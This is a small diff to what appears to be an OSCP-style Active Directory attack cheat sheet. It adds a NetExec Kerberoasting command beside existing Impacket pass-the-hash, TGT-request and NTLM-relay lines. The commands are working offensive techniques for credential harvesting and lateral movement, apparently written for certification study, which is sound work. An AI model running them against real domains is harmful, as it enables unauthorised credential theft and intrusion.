@@ -92,6 +92,7 @@ All Impacket examples accept `-hashes <LMHASH:NTHASH>` for pass-the-hash; use `-
 ### Kerberos & Ticket Operations
 - Use pass-the-hash with Kerberos (no password required):  
   `GetUserSPNs.py <domain>/<user> -hashes <LMHASH:NTHASH> -dc-ip <dc_ip>`
+  `nxc ldap <dc_ip> -u <user> -p <pass> --kerberoasting output.txt --kdcHost DC01.oscp.exam`
 - Request TGT using NT hash (pass-the-key):  
   `getTGT.py <domain>/<user> -hashes <LMHASH:NTHASH>`
 - Relay NTLM across protocols for lateral moves:  
